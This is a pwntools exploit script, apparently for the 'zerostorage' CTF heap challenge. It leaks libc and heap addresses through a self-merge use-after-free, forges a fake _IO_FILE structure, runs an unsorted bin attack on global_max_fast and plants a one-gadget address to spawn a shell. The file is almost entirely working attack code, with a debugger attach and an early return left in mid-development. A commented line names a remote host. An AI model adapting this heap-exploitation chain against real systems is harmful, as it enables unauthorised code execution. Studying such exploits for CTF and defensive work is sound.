# from pwn_debug.pwn_debug import *

# pdbg=pwn_debug("zerostorage")

# pdbg.context.terminal=['tmux', 'splitw', '-h']
# pdbg.context.log_level = 'debug'

# pdbg.local()
# # pdbg.debug("2.23")
# # pdbg.remote('34.92.37.22', 10002)
# p=pdbg.run("local")
# #p=pdbg.run("debug")
# # p=pdbg.run("debug")
# membp=pdbg.membp
# #print hex(membp.elf_base),hex(membp.libc_base)
# elf=pdbg.elf
# libc=pdbg.libc

from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
p = process('./zerostorage')
r=p
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF("./zerostorage")

def insert(size,data):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("entry: ")
    p.sendline(str(size))
    p.recvuntil("data: ")
    p.send(data)

def update(idx,size,data):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("ID: ")
    p.sendline(str(idx))
    p.recvuntil("entry: ")
    p.sendline(str(size))
    p.recvuntil("data: ")
    p.send(data)

def merge(from_idx,to_idx):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("ID: ")
    p.sendline(str(from_idx))
    p.recvuntil("ID: ")
    p.sendline(str(to_idx))

def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("4")
    p.recvuntil("ID: ")
    p.sendline(str(idx))
def view(idx,):
    p.recvuntil("choice: ")
    p.sendline("5")
    p.recvuntil("ID: ")
    p.sendline(str(idx))


def list():
    p.recvuntil("choice: ")
    p.sendline("6")


# _IO_list_all @    0x7ffff7dd2520 -> stderr
# _IO_2_1_stderr_ @ 0x7ffff7dd2540
# fastbinY          0x7ffff7dd1b28
def build_fake_file(addr,vtable):

    flag=0xfbad2887
    #flag&=~4
    #flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(addr)             #_IO_read_ptr
    fake_file+=p64(addr)             #_IO_read_end
    fake_file+=p64(addr)             #_IO_read_base
    fake_file+=p64(addr)             #_IO_write_base
    fake_file+=p64(addr+1)             #_IO_write_ptr
    fake_file+=p64(addr)         #_IO_write_end
    fake_file+=p64(addr)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)
    fake_file+=p64(0)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(0)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    fake_file+=p64(vtable)                       #vtable

    return fake_file


def pwn():

    #pdbg.bp([0x13ea,0x148a])
    insert(0x40,'a'*0x40) #0
    insert(0x40,'b'*0x40) #1
    insert(0x40,'c'*0x40) #2
    insert(0x40,'d'*0x40) #3
    insert(0x40,'e'*0x40) #4 
    insert(0x1000-0x10,'f'*(0x1000-0x10)) #5
    insert(0x400,'g'*0x400) #6
    insert(0x400,'h'*0x400) #7
    insert(0x40, 'i'*0x40) #8
    insert(0x60,'j'*0x60) #9

    delete(6)
    merge(7,5) #6



    insert(0x400,'a'*0x400) #5
    merge(0,0) # 7

    # !!important, do this to trig unsort bin and make leak the libc and heapbase in one time
    merge(2,2) # 0 


    ## step 1 leak libc address and heap address
    #pdbg.bp([0x120c,0x1052])
    view(7)
    p.recv(12)
    unsroted_root = u64(r.recv(8))
    unsorted_other = u64(r.recv(8))
    log.info("leak unsroted addr: %s, %s"%(hex(unsroted_root), hex(unsorted_other)))
    libc_base = unsroted_root -  0x3c4b78 # 0x7ffff7a0d000
    heap_base = unsorted_other - 0x120 # 0x555555758000
    system_addr = libc_base +  0x45390 # 0x7ffff7a52390
    print('----libc base: ', hex(libc_base))
    print('----heap base: ', hex(heap_base))

    global_max_fast =libc_base + 0x3c67f8



    io_stderr=libc_base+libc.symbols['_IO_2_1_stderr_'] #?? 0x7ffff7dd2540
    print('----io_stderr: ', hex(io_stderr))
    rce=libc_base+0xf1147  #??
    # rce=system_addr
    heap_addr=heap_base+0x1b90 #chunk9 'jjjj..'
    fake_file=build_fake_file(io_stderr,heap_addr)
    ## step 2 build a fake file
    log.info("step 2 build a fake file")
    update(6,0x1000-0x10,fake_file[0x10:].ljust(0x1000-0x10,'f'))


    ## step 3 form a 0x1410 big chunk with merge funcion
    log.info("step 3 form a 0x1410 big chunk with merge funcion")


    merge(5,6)

    ## step 4 unsorted bin attack to overwrite global_max_fast
    log.info("step 4 unsorted bin attack to overwrite global_max_fast")
    update(7,0x10,p64(unsroted_root)+p64(global_max_fast-0x10))
    insert(0x40,'a'*0x40) 
    #pdbg.bp([0x123f,0x15ce])
    update(9,0x60,p64(0)*2+p64(rce)*(0x50/8))
    #pdbg.bp(0x15ce)

    ## step 5 overwrite _IO_list_all 
    log.info("step 5 overwrite _IO_list_all")
    p.recv(timeout=0.1)
    gdb.attach(p, """
     x/10gx 0x00203060 + 0x555555554000 + 24*7
    """)
    return

    delete(2)

    ## step 6 trigger io flush to get shell
    log.info("step 6 trigger io flush to get shell")
    p.recvuntil(":")
    p.sendline('1')
    p.recvuntil(":")
    p.sendline("100")
    # p.interactive() #get the shell

if __name__ == '__main__':
   pwn()
   p.interactive()